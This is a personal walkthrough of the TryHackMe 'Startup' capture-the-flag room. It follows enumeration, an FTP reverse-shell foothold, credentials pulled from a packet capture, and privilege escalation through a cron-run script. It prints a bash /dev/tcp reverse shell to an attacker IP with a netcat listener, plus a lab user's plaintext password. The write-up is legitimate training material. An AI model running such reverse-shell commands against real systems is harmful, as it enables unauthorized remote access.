# TryHackMe - Startup CTF Walkthrough  

This is my walkthrough of the **Startup CTF room** on [TryHackMe](https://tryhackme.com).  

The room focuses on **enumeration, privilege escalation, and Linux fundamentals**. It was a great exercise in understanding how to pivot from initial access to root through services like **FTP, SSH, cron jobs, and process monitoring**.  

---

## 🖥️ Step 1: Connecting to the VPN  
Before starting, I connected to the TryHackMe server using my `.ovpn` configuration file:  

```bash
$ sudo openvpn Downloads/Ynos.ovpn
```  

This establishes a secure tunnel to interact with the target machine.  

---

## 🌐 Step 2: Checking Connectivity  
I confirmed I could reach the target machine with a simple **ping**:  

```bash
$ ping (Ip of the machine)
```  

This helps ensure there are no connectivity issues before scanning.  

---

## 🔍 Step 3: Nmap Scan  
I performed a full **Nmap scan** to enumerate open ports and services:  

```bash
$ nmap -sV -O -T5 -p- 10.10.207.53 -oN Nmap.results
```  

- `-sV` → Detect service versions  
- `-O` → Enable OS detection  
- `-T5` → Faster scan timing  
- `-p-` → Scan all 65535 ports  
- `-oN` → Save results in a file  

**Result:** The scan revealed that an **FTP server** was open.  

---

## 📂 Step 4: Web Enumeration with Dirbusting  
While Nmap was running, I also started a **directory brute-force scan** on the website.  

This revealed a directory named **`/files`**, containing:  
- **Among Us memes**  
- A hint mentioning a user named **maya**  

Interestingly, these files were accessible through **both FTP and HTTP**.  

---

## 💣 Step 5: Initial Foothold via FTP  
Since no obvious exploits were found, I tried **uploading a reverse shell** to the FTP server and executed it to gain access.  

At this point, I had access as the **`data` user**.  

---

## 🕵️ Step 6: Enumeration as `data`  
While enumerating, I discovered:  
- A **special ingredient** (flag)  
- A reference to another user: **lennie**  
- A suspicious file: **`suspicious.pcapng`**  

---

## 📡 Step 7: Packet Capture Analysis  
I analyzed `suspicious.pcapng` and extracted credentials for user **lennie**:  

```
Username: lennie  
Password: c4ntg3t3n0ughsp1c3
```  

---

## 🔑 Step 8: SSH into Lennie’s Account  
With these credentials, I successfully logged in via **SSH**:  

```bash
$ ssh lennie@10.10.207.53
```  

Inside Lennie’s account, I found the **second flag**.  

---

## ⏱️ Step 9: Privilege Escalation Attempts  
Naturally, I checked for scheduled tasks using **crontab**, since automated scripts often lead to privilege escalation:  

```bash
$ crontab -l
```  

However, I couldn’t directly access the root crontab.  

---

## 👀 Step 10: Process Snooping with pspy64  
To get around this, I used **pspy64**, a tool for monitoring processes without root privileges.  

- I uploaded `pspy64` to the machine via FTP.  
- Downloaded and executed it on Lennie’s account.  

This revealed that a **script was being executed every minute** by Lennie’s user.  

---

## 🐚 Step 11: Exploiting the Scheduled Script  
I replaced the script with a **bash reverse shell**:  

```bash
$ echo ‘bash -i >& /dev/tcp/10.23.132.255/4242 0>&1’ > etc/print.sh
```  

Then, I set up a Netcat listener on my machine:  

```bash
$ nc -nclp 4242
```  

Within a minute, the cron job triggered, and I gained a shell as **root** 🎉.  

---

## 🎯 Lessons Learned  
This room was an excellent practical demonstration of:  
- **Service Enumeration** → FTP & HTTP gave dual access to files.  
- **Packet Analysis** → Extracting credentials from `.pcapng`.  
- **Privilege Escalation** → Using pspy64 to monitor cron jobs.  
- **Reverse Shells** → Crafting payloads to gain root access.  

---

## 🚩 Flags Captured  
1. User `data` → Special Ingredient  
2. User `lennie` → Second Flag  
3. Root → Final Flag  

---

## 📝 Final Thoughts  
The **Startup CTF** room was a fun balance between basic enumeration and creative privilege escalation. The use of **pspy64** for process monitoring was especially valuable, as it mimics real-world scenarios where direct cron access isn’t possible.  

I’d recommend this room for anyone looking to practice **Linux privilege escalation** and improve their **problem-solving workflow** during CTFs.  
